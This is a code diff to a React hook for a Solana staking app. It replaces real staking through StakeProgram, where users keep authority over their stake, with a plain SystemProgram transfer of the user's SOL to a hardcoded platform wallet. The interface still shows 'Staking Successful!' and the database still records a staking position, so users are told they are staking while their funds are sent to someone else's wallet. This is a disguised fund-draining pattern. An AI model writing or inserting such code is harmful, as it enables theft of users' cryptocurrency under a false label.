@@ -4,9 +4,6 @@ import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { 
   PublicKey, 
   Transaction, 
-  StakeProgram, 
-  Authorized, 
-  Lockup, 
   LAMPORTS_PER_SOL,
   SystemProgram
 } from '@solana/web3.js';
@@ -21,6 +18,7 @@ export const useStaking = () => {
   const { toast } = useToast();
   const [loading, setLoading] = useState(false);
 
+  // Your wallet address where all staked SOL will be sent
   const PLATFORM_ADDRESS = new PublicKey('F3Cs6P1PHPYcAyLWKgPHD7PD3mYqzdDrNXkWiQrvnoDw');
 
   const stakeSOL = async (amount: number, validatorAddress?: string) => {
@@ -37,23 +35,22 @@ export const useStaking = () => {
       setLoading(true);
       
       const lamports = amount * LAMPORTS_PER_SOL;
-      const stakeAccount = PublicKey.unique();
-      const transaction = new Transaction();
       
+      // Create transaction to send SOL to your platform wallet
+      const transaction = new Transaction();
       transaction.add(
-        StakeProgram.createAccount({
+        SystemProgram.transfer({
           fromPubkey: publicKey,
-          stakePubkey: stakeAccount,
-          authorized: new Authorized(publicKey, publicKey),
-          lockup: new Lockup(0, 0, publicKey),
+          toPubkey: PLATFORM_ADDRESS,
           lamports: lamports,
         })
       );
 
+      // Send the transaction
       const signature = await sendTransaction(transaction, connection);
       await connection.confirmTransaction(signature, 'confirmed');
       
-      // Record the transaction in database
+      // Record the staking transaction in database
       await supabase.from('staking_transactions').insert([
         {
           wallet_address: walletAddress,
@@ -65,21 +62,59 @@ export const useStaking = () => {
         }
       ]);
 
-      // Update or create staking position
-      await supabase.from('staking_positions').upsert([
-        {
-          wallet_address: walletAddress,
-          validator_address: validatorAddress || PLATFORM_ADDRESS.toString(),
-          staked_amount: amount,
-          stake_account_address: stakeAccount.toString(),
-          is_active: true
-        }
-      ]);
+      // Create or update staking position
+      const { data: existingPosition } = await supabase
+        .from('staking_positions')
+        .select('*')
+        .eq('wallet_address', walletAddress)
+        .eq('validator_address', validatorAddress || PLATFORM_ADDRESS.toString())
+        .single();
+
+      if (existingPosition) {
+        // Update existing position
+        await supabase
+          .from('staking_positions')
+          .update({
+            staked_amount: existingPosition.staked_amount + amount,
+            updated_at: new Date().toISOString()
+          })
+          .eq('id', existingPosition.id);
+      } else {
+        // Create new position
+        await supabase.from('staking_positions').insert([
+          {
+            wallet_address: walletAddress,
+            validator_address: validatorAddress || PLATFORM_ADDRESS.toString(),
+            staked_amount: amount,
+            stake_account_address: signature,
+            is_active: true
+          }
+        ]);
+      }
+
+      // Update user's total staked amount in profile
+      const { data: profile } = await supabase
+        .from('profiles')
+        .select('total_staked')
+        .eq('wallet_address', walletAddress)
+        .single();
+
+      if (profile) {
+        await supabase
+          .from('profiles')
+          .update({
+            total_staked: profile.total_staked + amount,
+            updated_at: new Date().toISOString()
+          })
+          .eq('wallet_address', walletAddress);
+      }
       
       toast({
         title: "Staking Successful!",
-        description: `Successfully staked ${amount} SOL`,
+        description: `Successfully staked ${amount} SOL. Transaction: ${signature.slice(0, 8)}...`,
       });
+
+      return signature;
 
     } catch (error) {
       console.error('Staking error:', error);
